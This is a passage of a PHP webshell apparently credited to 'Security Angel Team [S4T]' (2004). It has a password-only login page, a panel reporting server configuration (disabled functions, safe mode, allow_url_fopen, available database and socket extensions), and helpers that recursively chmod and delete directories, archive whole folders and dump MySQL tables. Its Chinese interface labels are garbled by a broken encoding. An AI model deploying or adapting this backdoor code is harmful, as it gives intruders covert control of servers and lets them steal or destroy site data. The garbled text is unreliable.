	$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
	if ($dis_func == "") {
		$dis_func = "No";
	}else {
		$dis_func = str_replace(" ","<br>",$dis_func);
		$dis_func = str_replace(",","<br>",$dis_func);
	}
	$phpinfo=(!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
		$info = array(
			0  => array("ʱ",date("Ymd h:i:s",time())),
			1  => array("","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
			2  => array("IPַ",gethostbyname($_SERVER['SERVER_NAME'])),
			3  => array("ϵͳ",PHP_OS),
			5  => array("ϵͳֱ",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
			6  => array("",$_SERVER['SERVER_SOFTWARE']),
			7  => array("Web˿",$_SERVER['SERVER_PORT']),
			8  => array("PHPзʽ",strtoupper(php_sapi_name())),
			9  => array("PHP汾",PHP_VERSION),
			10 => array("ڰȫģʽ",getphpcfg("safemode")),
			11 => array("Ա",$adminmail),
			12 => array("ļ·",__FILE__),

			13 => array("ʹ URL ļ allow_url_fopen",getphpcfg("allow_url_fopen")),
			14 => array("̬ӿ enable_dl",getphpcfg("enable_dl")),
			15 => array("ʾϢ display_errors",getphpcfg("display_errors")),
			16 => array("Զȫֱ register_globals",getphpcfg("register_globals")),
			17 => array("magic_quotes_gpc",getphpcfg("magic_quotes_gpc")),
			18 => array("ʹڴ memory_limit",getphpcfg("memory_limit")),
			19 => array("POSTֽ post_max_size",getphpcfg("post_max_size")),
			20 => array("ϴļ upload_max_filesize",$upsize),
			21 => array("ʱ max_execution_time",getphpcfg("max_execution_time").""),
			22 => array("õĺ disable_functions",$dis_func),
			23 => array("phpinfo()",$phpinfo),
			24 => array("Ŀǰпռdiskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),

			25 => array("ͼδ GD Library",getfun("imageline")),
			26 => array("IMAPʼϵͳ",getfun("imap_close")),
			27 => array("MySQLݿ",getfun("mysql_close")),
			28 => array("SyBaseݿ",getfun("sybase_close")),
			29 => array("Oracleݿ",getfun("ora_close")),
			30 => array("Oracle 8 ݿ",getfun("OCILogOff")),
			31 => array("PREL﷨ PCRE",getfun("preg_match")),
			32 => array("PDFĵ֧",getfun("pdf_close")),
			33 => array("Postgre SQLݿ",getfun("pg_close")),
			34 => array("SNMPЭ",getfun("snmpget")),
			35 => array("ѹļ֧(Zlib)",getfun("gzclose")),
			36 => array("XML",getfun("xml_set_object")),
			37 => array("FTP",getfun("ftp_login")),
			38 => array("ODBCݿ",getfun("odbc_close")),
			39 => array("Session֧",getfun("session_start")),
			40 => array("Socket֧",getfun("fsockopen")),
		); 

	$tb->tableheader();
	echo "<form action=\"?action=phpenv\" method=\"POST\">\n";
	$tb->tdbody('<b>鿴PHPò״</b>','left','1','30','style="padding-left: 5px;"');
	$tb->tdbody('ò(:magic_quotes_gpc): '.$tb->makeinput('phpvarname','','','text','40').' '.$tb->makeinput('','鿴','','submit'),'left','2','30','style="padding-left: 5px;"');
	$tb->makehidden('do','viewphpvar');
	echo "</form>\n";
	$hp = array(0=> '', 1=> 'PHP', 2=> '֧״');
	for ($a=0;$a<3;$a++) {
		$tb->tdbody('<b>'.$hp[1].'</b>','left','1','30','style="padding-left: 5px;"');
?>
  <tr class="secondalt">
    <td>
      <table width="100%" border="0" cellpadding="0" cellspacing="0">
<?php
		if ($a==0) {
			for($i=0;$i<=12;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		} elseif ($a == 1) {
			for ($i=13;$i<=24;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		} elseif ($a == 2) {
			for ($i=25;$i<=40;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		}
?>
      </table>
    </td>
  </tr>
<?php
	}//for
echo "</table>";
}//end phpenv
?>
<hr width="775" noshade>
<table width="775" border="0" cellpadding="0">
  <tr>
    <td>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved.</td>
    <td align="right"><?php
	debuginfo();
	ob_end_flush();	
	?></td>
  </tr>
</table>
</center>
</body>
</html>

<?php

/*======================================================

======================================================*/

	// ½
	function loginpage() {
?>
<style type="text/css">
input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";height: "18px";border: "1px solid #666666";}
</style>
<form method="POST" action="">
<span style="font-size: 11px; font-family: Verdana">Password: </span><input name="adminpass" type="password" size="20">
<input type="hidden" name="do" value="login">
<input type="submit" value="Login">
</form>
<?php
		exit;
	}//end loginpage()

	// ҳϢ
	function debuginfo() {
		global $starttime;
		$mtime = explode(' ', microtime());
		$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
		echo "Processed in $totaltime second(s)";
	}

	// ȥתַ
	function stripslashes_array(&$array) {
		while(list($key,$var) = each($array)) {
			if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
				if (is_string($var)) {
					$array[$key] = stripslashes($var);
				}
				if (is_array($var))  {
					$array[$key] = stripslashes_array($var);
				}
			}
		}
		return $array;
	}

	// ɾĿ¼
	function deltree($deldir) {
		$mydir=@dir($deldir);	
		while($file=$mydir->read())	{ 		
			if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) { 
				@chmod("$deldir/$file",0777);
				deltree("$deldir/$file"); 
			}
			if (is_file("$deldir/$file")) {
				@chmod("$deldir/$file",0777);
				@unlink("$deldir/$file");
			}
		} 
		$mydir->close(); 
		@chmod("$deldir",0777);
		return (@rmdir($deldir)) ? 1 : 0;
	} 

	// ж϶д
	function dir_writeable($dir) {
		if (!is_dir($dir)) {
			@mkdir($dir, 0777);
		}
		if(is_dir($dir)) {
			if ($fp = @fopen("$dir/test.txt", 'w')) {
				@fclose($fp);
				@unlink("$dir/test.txt");
				$writeable = 1;
			} else {
				$writeable = 0;
			}
		}
		return $writeable;
	}

	// мıɫ滻
	function getrowbg() {
		global $bgcounter;
		if ($bgcounter++%2==0) {
			return "firstalt";
		} else {
			return "secondalt";
		}
	}

	// ȡǰļϵͳ·
	function getPath($mainpath, $relativepath) {
		global $dir;
		$mainpath_info           = explode('/', $mainpath);
		$relativepath_info       = explode('/', $relativepath);
		$relativepath_info_count = count($relativepath_info);
		for ($i=0; $i<$relativepath_info_count; $i++) {
			if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
			if ($relativepath_info[$i] == '..') {
				$mainpath_info_count = count($mainpath_info);
				unset($mainpath_info[$mainpath_info_count-1]);
				continue;
			}
			$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
		} //end for
		return implode('/', $mainpath_info);
	}

	// PHPò
	function getphpcfg($varname) {
		switch($result = get_cfg_var($varname)) {
			case 0:
			return "No";
			break;
			case 1:
			return "Yes";
			break;
			default:
			return $result;
			break;
		}
	}

	// 麯
	function getfun($funName) {
		return (false !== function_exists($funName)) ? "Yes" : "No";
	}

	// ѹ
	class PHPZip{
	var $out='';
		function PHPZip($dir)	{
    		if (@function_exists('gzcompress'))	{
				$curdir = getcwd();
				if (is_array($dir)) $filelist = $dir;
		        else{
			        $filelist=$this -> GetFileList($dir);//ļб
				    foreach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);
	            }
		        if ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);
				else chdir($curdir);
				if (count($filelist)>0){
					foreach($filelist as $filename){
						if (is_file($filename)){
							$fd = fopen ($filename, "r");
							$content = @fread ($fd, filesize ($filename));
							fclose ($fd);
						    if (is_array($dir)) $filename = basename($filename);
							$this -> addFile($content, $filename);
						}
					}
					$this->out = $this -> file();
					chdir($curdir);
				}
				return 1;
			}
			else return 0;
		}

		// ָĿ¼ļб
		function GetFileList($dir){
			static $a;
			if (is_dir($dir)) {
				if ($dh = opendir($dir)) {
			   		while (($file = readdir($dh)) !== false) {
						if($file!='.' && $file!='..'){
            				$f=$dir .'/'. $file;
            				if(is_dir($f)) $this->GetFileList($f);
							$a[]=$f;
	        			}
					}
     				closedir($dh);
    			}
			}
			return $a;
		}

		var $datasec      = array();
	    var $ctrl_dir     = array();
		var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	    var $old_offset   = 0;

		function unix2DosTime($unixtime = 0) {
	        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
		    if ($timearray['year'] < 1980) {
				$timearray['year']    = 1980;
        		$timearray['mon']     = 1;
	        	$timearray['mday']    = 1;
		    	$timearray['hours']   = 0;
				$timearray['minutes'] = 0;
        		$timearray['seconds'] = 0;
	        } // end if
		    return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
			        ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
	    }

		function addFile($data, $name, $time = 0) {
	        $name     = str_replace('\\', '/', $name);

		    $dtime    = dechex($this->unix2DosTime($time));
	        $hexdtime = '\x' . $dtime[6] . $dtime[7]
		              . '\x' . $dtime[4] . $dtime[5]
			          . '\x' . $dtime[2] . $dtime[3]
				      . '\x' . $dtime[0] . $dtime[1];
	        eval('$hexdtime = "' . $hexdtime . '";');
		    $fr   = "\x50\x4b\x03\x04";
			$fr   .= "\x14\x00";
	        $fr   .= "\x00\x00";
		    $fr   .= "\x08\x00";
			$fr   .= $hexdtime;

	        $unc_len = strlen($data);
		    $crc     = crc32($data);
			$zdata   = gzcompress($data);
	        $c_len   = strlen($zdata);
		    $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
			$fr      .= pack('V', $crc);
	        $fr      .= pack('V', $c_len);
		    $fr      .= pack('V', $unc_len);
			$fr      .= pack('v', strlen($name));
	        $fr      .= pack('v', 0);
		    $fr      .= $name;

			$fr .= $zdata;

	        $fr .= pack('V', $crc);
		    $fr .= pack('V', $c_len);
			$fr .= pack('V', $unc_len);

	        $this -> datasec[] = $fr;
		    $new_offset        = strlen(implode('', $this->datasec));

			$cdrec = "\x50\x4b\x01\x02";
	        $cdrec .= "\x00\x00";
		    $cdrec .= "\x14\x00";
			$cdrec .= "\x00\x00";
	        $cdrec .= "\x08\x00";
		    $cdrec .= $hexdtime;
			$cdrec .= pack('V', $crc);
	        $cdrec .= pack('V', $c_len);
		    $cdrec .= pack('V', $unc_len);
			$cdrec .= pack('v', strlen($name) );
	        $cdrec .= pack('v', 0 );
		    $cdrec .= pack('v', 0 );
			$cdrec .= pack('v', 0 );
	        $cdrec .= pack('v', 0 );
		    $cdrec .= pack('V', 32 );
			$cdrec .= pack('V', $this -> old_offset );
	        $this -> old_offset = $new_offset;
		    $cdrec .= $name;

			$this -> ctrl_dir[] = $cdrec;
	    }

		function file() {
			$data    = implode('', $this -> datasec);
	        $ctrldir = implode('', $this -> ctrl_dir);
		    return
			    $data .
				$ctrldir .
	            $this -> eof_ctrl_dir .
		        pack('v', sizeof($this -> ctrl_dir)) .
			    pack('v', sizeof($this -> ctrl_dir)) .
				pack('V', strlen($ctrldir)) .
	            pack('V', strlen($data)) .
		        "\x00\x00";
	    }
	}

	// ݿ
	function sqldumptable($table, $fp=0) {
		$tabledump = "DROP TABLE IF EXISTS $table;\n";
		$tabledump .= "CREATE TABLE $table (\n";

		$firstfield=1;

		$fields = mysql_query("SHOW FIELDS FROM $table");
		while ($field = mysql_fetch_array($fields)) {
			if (!$firstfield) {
				$tabledump .= ",\n";
			} else {
				$firstfield=0;
			}
			$tabledump .= "   $field[Field] $field[Type]";
			if (!empty($field["Default"])) {
				$tabledump .= " DEFAULT '$field[Default]'";
			}
			if ($field['Null'] != "YES") {
				$tabledump .= " NOT NULL";
			}
			if ($field['Extra'] != "") {
				$tabledump .= " $field[Extra]";
			}
		}
		mysql_free_result($fields);
	
		$keys = mysql_query("SHOW KEYS FROM $table");
		while ($key = mysql_fetch_array($keys)) {
			$kname=$key['Key_name'];
			if ($kname != "PRIMARY" and $key['Non_unique'] == 0) {
				$kname="UNIQUE|$kname";
			}
			if(!is_array($index[$kname])) {
				$index[$kname] = array();
			}
			$index[$kname][] = $key['Column_name'];
		}
		mysql_free_result($keys);

		while(list($kname, $columns) = @each($index)) {
			$tabledump .= ",\n";
			$colnames=implode($columns,",");

			if ($kname == "PRIMARY") {
				$tabledump .= "   PRIMARY KEY ($colnames)";
			} else {
				if (substr($kname,0,6) == "UNIQUE") {
					$kname=substr($kname,7);
				}
				$tabledump .= "   KEY $kname ($colnames)";
			}
		}

		$tabledump .= "\n);\n\n";
		if ($fp) {
			fwrite($fp,$tabledump);
		} else {
			echo $tabledump;
		}

		$rows = mysql_query("SELECT * FROM $table");
		$numfields = mysql_num_fields($rows);
		while ($row = mysql_fetch_array($rows)) {
			$tabledump = "INSERT INTO $table VALUES(";

			$fieldcounter=-1;
			$firstfield=1;
			while (++$fieldcounter<$numfields) {
				if (!$firstfield) {
					$tabledump.=", ";
				} else {
					$firstfield=0;
				}

				if (!isset($row[$fieldcounter])) {
					$tabledump .= "NULL";
				} else {
					$tabledump .= "'".mysql_escape_string($row[$fieldcounter])."'";
				}
			}

			$tabledump .= ");\n";

			if ($fp) {
				fwrite($fp,$tabledump);
			} else {
				echo $tabledump;
			}
		}
		mysql_free_result($rows);
	}

	class FORMS {
		function tableheader() {
			echo "<table width=\"775\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\">\n";
		}

		function headerform($arg=array()) {
			global $dir;
			if ($arg[enctype]){
				$enctype="enctype=\"$arg[enctype]\"";
			} else {
				$enctype="";
			}
			if (!isset($arg[method])) {
				$arg[method] = "POST";
			}
			if (!isset($arg[action])) {
				$arg[action] = '';
			}
			echo "  <form action=\"".$arg[action]."\" method=\"".$arg[method]."\" $enctype>\n";
			echo "  <tr>\n";
			echo "    <td>".$arg[content]."</td>\n";
			echo "  </tr>\n";
			echo "  </form>\n";
		}

		function tdheader($title) {
			global $dir;
			echo "  <tr class=\"firstalt\">\n";
			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\"></a>]</b></td>\n";
			echo "  </tr>\n";
		}

		function tdbody($content,$align='center',$bgcolor='2',$height='',$extra='',$colspan='') {
			if ($bgcolor=='2') {
				$css="secondalt";
			} elseif ($bgcolor=='1') {
				$css="firstalt";
			} else {
				$css=$bgcolor;
			}
			$height = empty($height) ? "" : " height=".$height;
			$colspan = empty($colspan) ? "" : " colspan=".$colspan;
			echo "  <tr class=\"".$css."\">\n";
			echo "	<td align=\"".$align."\"".$height." ".$colspan." ".$extra.">".$content."</td>\n";
			echo "  </tr>\n";
		}

		function tablefooter() {
			echo "</table>\n";
		}

		function formheader($action='',$title,$target='') {
			global $dir;
			$target = empty($target) ? "" : " target=\"".$target."\"";
			echo " <form action=\"$action\" method=\"POST\"".$target.">\n";
			echo "  <tr class=\"firstalt\">\n";
			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\"></a>]</b></td>\n";
			echo "  </tr>\n";
		}

		function makehidden($name,$value=''){
			echo "<input type=\"hidden\" name=\"$name\" value=\"$value\">\n";
		}

		function makeinput($name,$value='',$extra='',$type='text',$size='30',$css='input'){
			$css = ($css == 'input') ? " class=\"input\"" : "";
			$input = "<input name=\"$name\" value=\"$value\" type=\"$type\" ".$css." size=\"$size\" $extra>\n";
			return $input;
		}

		function maketextarea($name,$content='',$cols='100',$rows='20',$extra=''){
			$textarea = "<textarea name=\"".$name."\" cols=\"".$cols."\" rows=\"".$rows."\" ".$extra.">".$content."</textarea>\n";
			return $textarea;
		}

		function formfooter($over='',$height=''){
			$height = empty($height) ? "" : " height=\"".$height."\"";
			echo "  <tr class=\"secondalt\">\n";
			echo "	<td align=\"center\"".$height."><input class=\"input\" type=\"submit\" value=\"ȷ\"></td>\n";
			echo "  </tr>\n";
			echo " </form>\n";
			echo $end = empty($over) ? "" : "</table>\n";
		}

		function makeselect($arg = array()){
			if ($arg[multiple]==1) {
				$multiple = " multiple";
				if ($arg[size]>0) {
					$size = "size=$arg[size]";
				}
			}
			if ($arg[css]==0) {
				$css = "class=\"input\"";
			}
			$select = "<select $css name=\"$arg[name]\"$multiple $size>\n";
				if (is_array($arg[option])) {
					foreach ($arg[option] AS $key=>$value) {
						if (!is_array($arg[selected])) {
							if ($arg[selected]==$key) {
								$select .= "<option value=\"$key\" selected>$value</option>\n";
							} else {
								$select .= "<option value=\"$key\">$value</option>\n";
							}

						} elseif (is_array($arg[selected])) {
							if ($arg[selected][$key]==1) {
								$select .= "<option value=\"$key\" selected>$value</option>\n";
							} else {
								$select .= "<option value=\"$key\">$value</option>\n";
							}
						}
					}
				}
			$select .= "</select>\n";
			return $select;
		}
	}
?>